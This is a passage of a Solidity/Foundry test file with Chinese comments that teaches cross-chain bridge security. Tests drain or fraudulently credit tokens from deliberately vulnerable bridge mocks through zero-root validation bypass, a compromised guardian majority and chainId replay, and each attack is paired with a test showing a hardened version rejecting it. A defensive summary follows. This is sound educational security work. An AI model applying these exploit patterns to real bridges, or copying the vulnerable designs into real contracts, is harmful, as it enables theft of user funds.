        console.log("Safe: wrong dstChainId rejected");
    }

    // ─────────────────────────────────────────────
    // 测试4：验证绕过——Nomad 零值根
    // ─────────────────────────────────────────────
    function testValidationBypass() public {
        console.log("\n== TEST: Validation Bypass - Zero Root ==");

        // 验证初始条件：bytes32(0) 确实被接受
        assertTrue(vulnValidation.acceptableRoot(bytes32(0)), "Zero root accepted");

        uint256 amount = 200_000e18;
        validationAttacker.attack(amount);

        uint256 bal = token4.balanceOf(address(validationAttacker));
        assertEq(bal, amount, "Arbitrary message processed: tokens received");
        console.log("Validation bypass: received tokens without legitimate proof");
    }

    function testSafeValidationRejectsZeroRoot() public {
        console.log("\n== TEST: Safe Validation - Rejects Zero Root ==");

        // 安全版本不接受零值根
        assertFalse(safeValidation.acceptableRoot(bytes32(0)), "Safe: zero root rejected");

        // 未经 prove 的消息不能被 process
        bytes memory fakeMessage = abi.encode(uint8(1), abi.encode(address(this), uint256(1000e18)));
        vm.expectRevert("Message not proven");
        safeValidation.process(fakeMessage);
        console.log("Safe: unproven message rejected");
    }

    // ─────────────────────────────────────────────
    // 测试5：守护者多数妥协
    // ─────────────────────────────────────────────
    function testGuardianMajorityCompromise() public {
        console.log("\n== TEST: Guardian Majority Compromise ==");

        bytes32 txHash  = keccak256("drain_tx");
        uint256 amount  = token5.balanceOf(address(vulnGuardian)); // 清空整个桥
        address attacker = address(guardianAttacker);

        // 攻击者控制 5 个守护者（下标 0-4，满足 5/9 阈值）
        bytes[] memory sigs = new bytes[](5);
        for (uint i = 0; i < 5; i++) {
            bytes32 msgHash = keccak256(abi.encodePacked(txHash, attacker, amount));
            bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(guardianKeys[i], ethHash);
            sigs[i] = abi.encodePacked(r, s, v);
        }

        guardianAttacker.attack(txHash, amount, sigs);

        uint256 bridgeBal = token5.balanceOf(address(vulnGuardian));
        uint256 attackerBal = token5.balanceOf(attacker);
        assertEq(attackerBal, amount, "Full bridge drained with majority guardians");
        assertEq(bridgeBal, 0, "Bridge emptied");
        console.log("Bridge drained:", amount);
    }

    function testSafeGuardianWithDelay() public {
        console.log("\n== TEST: Safe Guardian - Execution Delay ==");

        bytes32 txHash  = keccak256("safe_drain_tx");
        uint256 amount  = 500_000e18;
        address attacker = address(this);

        // 5 个守护者签名（达到阈值）
        for (uint i = 0; i < 5; i++) {
            bytes32 msgHash = keccak256(abi.encodePacked(txHash, attacker, amount));
            bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(guardianKeys[i], ethHash);
            bytes memory sig = abi.encodePacked(r, s, v);
            safeGuardian.submitSignature(txHash, attacker, amount, sig);
        }

        // 立即执行应失败（24 小时延迟）
        vm.expectRevert("Delay not met");
        safeGuardian.executeWithdrawal(txHash, attacker, amount);
        console.log("Safe: immediate execution blocked by 24h delay");

        // 等待 24 小时后执行成功
        vm.warp(block.timestamp + 24 hours + 1);
        safeGuardian.executeWithdrawal(txHash, attacker, amount);
        console.log("Safe: executed after 24h delay");

        // 注意：有了延迟，安全团队有时间检测并撤销恶意交易
    }

    // ─────────────────────────────────────────────
    // 测试6：chainId 重放
    // ─────────────────────────────────────────────
    function testChainIdReplay() public {
        console.log("\n== TEST: ChainId Replay - Wrong Chain Accepted ==");

        address recipient = address(0xFACE);
        uint256 amount    = 80_000e18;
        uint256 srcChain  = 1;   // ETH mainnet
        uint256 dstChain  = 999; // 签名说目标链是 999（与 block.chainid 不同）
        bytes32 nonce     = keccak256("nonce_1");

        // 签名包含错误的 dstChainId
        bytes32 msgHash = keccak256(abi.encodePacked(recipient, amount, srcChain, dstChain, nonce));
        bytes32 ethHash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", msgHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(relayerKey6, ethHash);
        bytes memory sig = abi.encodePacked(r, s, v);

        console.log("block.chainid:", block.chainid);
        console.log("dstChainId in message:", dstChain);
        console.log("These don't match but bridge doesn't check...");

        uint256 balBefore = token6.balanceOf(recipient);
        vulnChainId.processMessage_NoChainCheck(recipient, amount, srcChain, dstChain, nonce, sig);
        uint256 balAfter = token6.balanceOf(recipient);

        assertEq(balAfter - balBefore, amount, "ChainId mismatch accepted (no check)");
        console.log("ChainId replay: tokens received on wrong chain");
    }

    function testSafeChainIdRejectsWrongChain() public {
        console.log("\n== TEST: Safe ChainId - Rejects Wrong Destination ==");

        address recipient = address(0xFACE);
        uint256 amount    = 80_000e18;
        uint256 srcChain  = 1;
        uint256 dstChain  = 999; // 错误的目标链
        bytes32 nonce     = keccak256("safe_nonce_1");

        bytes32 structHash = keccak256(abi.encode(
            safeChainId.MSG_TYPEHASH(), recipient, amount, srcChain, dstChain, nonce
        ));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", safeChainId.DOMAIN_SEPARATOR(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(relayerKey6, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        vm.expectRevert("Wrong destination chain");
        safeChainId.processMessage(recipient, amount, srcChain, dstChain, nonce, sig);
        console.log("Safe: wrong destination chain rejected");

        // 正确 chainId 可以通过
        uint256 correctDst = block.chainid;
        bytes32 nonce2 = keccak256("safe_nonce_2");
        bytes32 structHash2 = keccak256(abi.encode(
            safeChainId.MSG_TYPEHASH(), recipient, amount, srcChain, correctDst, nonce2
        ));
        bytes32 digest2 = keccak256(abi.encodePacked("\x19\x01", safeChainId.DOMAIN_SEPARATOR(), structHash2));
        (uint8 v2, bytes32 r2, bytes32 s2) = vm.sign(relayerKey6, digest2);
        bytes memory sig2 = abi.encodePacked(r2, s2, v2);

        safeChainId.processMessage(recipient, amount, srcChain, correctDst, nonce2, sig2);
        assertEq(token6.balanceOf(recipient), amount, "Correct chain: processed successfully");
        console.log("Safe: correct destination chain accepted");
    }
}


/**
 * ============ 知识点总结 ============
 *
 * 1. 消息重放攻击 (Message Replay)：
 *    - 每条跨链消息必须有唯一标识（nonce 或消息哈希）
 *    - 处理后必须标记 processedMessages[hash] = true
 *    - Nomad 攻击：根被设为 0x00，任意消息通过验证，等效于无限重放
 *    - 防御：processed mapping + 消息唯一性 ID（nonce/txHash/msgId）
 *
 * 2. 签名伪造 (Signature Forgery)：
 *    - ecrecover 失败时返回 address(0)，必须 require(recovered != 0)
 *    - guardian 本身不能是 address(0)
 *    - 签名延展性：s 值限制在低半区（OpenZeppelin ECDSA）
 *    - 使用消息内容去重，而非签名字节去重（长度填充绕过）
 *    - Wormhole：Solana sysvar account 未验证 = 无需有效签名
 *
 * 3. 域分隔符不当 (Improper Domain Separation)：
 *    - EIP-712 域必须包含全部四要素：name + version + chainId + verifyingContract
 *    - 缺少 chainId：同一签名在所有 EVM 链上有效
 *    - 缺少 verifyingContract：升级合约后旧签名仍有效
 *    - 消息体额外包含 srcChainId + dstChainId（双重防护）
 *
 * 4. 验证绕过 (Validation Bypass)：
 *    - 默认值陷阱：mapping 默认 false/bytes32(0)，不可被验证函数接受
 *    - 不要在构造函数中设置 bytes32(0) 为有效根（Nomad bug）
 *    - 消息必须先 prove() 才能 process()，不能用默认值
 *    - 类型系统：不同消息类型通过独立函数处理（分离权限）
 *
 * 5. 守护者多数妥协 (Guardian Majority Compromise)：
 *    - 阈值设计：建议 7/11 或 8/13（越高越安全，但牺牲活性）
 *    - 执行延迟：签名完成后 24-48 小时才执行（给安全团队响应时间）
 *    - 速率限制：每日最大提款额（限制单次攻击损失）
 *    - 守护者轮换：新增守护者需要 7 天延迟
 *    - 历史授权清理：定期检查并撤销不再使用的授权（Ronin 教训）
 *
 * 6. 跨链 chainId 重放 (Cross-chain ChainId Replay)：
 *    - 消息体中必须包含 dstChainId，执行时必须验证
 *    - 不使用硬编码 chainId，始终使用 block.chainid
 *    - EIP-712 域 + 消息体两层绑定（双重防护）
 *    - ResourceID 必须包含链信息（Meter Passport 教训）
 *    - EIP-155 之前的签名没有 chainId，在 fork 后可被重放
 *
 * 与 Balancer V2 的核心连接：
 *    - Balancer Authorizer 的跨链权限消息（L1→L2 governance）
 *      使用 CrossChainAuthorizer，内部有 actionId + chainId 绑定
 *    - veBAL 跨链投票权同步（LayerZero/官方桥）
 *      需要防止场景6：在 ETH 签名的投票权更新不能在 Arbitrum 重用
 *    - omnichain gauge（reward forwarder）
 *      消息中必须包含目标 gauge 地址和 chainId
 *    - Balancer V2 Vault 的管理操作（setAuthorizer）
 *      通过 TimelockAuthorizer 强制延迟，对应场景5的执行延迟
 */
